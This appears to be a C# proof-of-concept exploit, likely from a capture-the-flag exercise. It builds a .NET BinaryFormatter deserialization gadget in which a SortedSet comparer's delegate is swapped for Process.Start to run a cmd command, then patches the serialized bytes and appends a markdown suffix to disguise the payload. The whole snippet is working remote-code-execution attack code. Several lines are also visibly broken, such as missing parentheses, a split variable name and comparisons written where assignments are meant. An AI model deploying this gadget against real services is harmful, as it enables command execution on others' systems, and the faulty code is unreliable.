var singleDelegate = new Comparison<string>(String.Compare);
var multiDelegate = singleDelegate + singleDelegate;
var comparer = Comparer<string>.Create(multiDelegate); 
var invocationList= multiDelegate.GetInvocationList();
var gadget= new SortedSet<string>(comparer) {"cmd", $"/c ping -n 2 10.10.14.16"};
invocationList[1] = new Func<string,string,Process>(Process.Start);
var field = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
field.SetValue(multiDelegate, invocationList);

var binaryFormatter = new BinaryFormatter; 
var stream = new MemoryStream();
binaryFormatter.Serialize (stream, gadget);
stream.Position = 0 ; 
var binary Payload = stream.TOArray();

var count = 0;

for (int i = 0; i < binaryPayload.Length - 4;i++)
{
if (binaryPayload[i] == 0x01 && binaryPayload[i+1] ==0x00 && binaryPayload[i+2] ==0x00 && binaryPayload[i+3] == 0x00)
{
count++;
if (count ==1 || count ==3){
binaryPayload[i] ==0x00;
binaryPayload[i+1] ==0xFE;
binaryPayload[i+2] ==0xFF;
}
if (count >=3){
break;}
}
}
  
var markdownPayload = Encoding.UTF8.GetBytes("\n```**Header**\t");

var result = new byte[binaryPayload.Length + markdownPayload.Length];

Array.Copy(binaryPayload, result, binaryPayload.Length);

Array.Copy(markdownPayload,0, result, binaryPayload.Length, markdownPayload.Length);

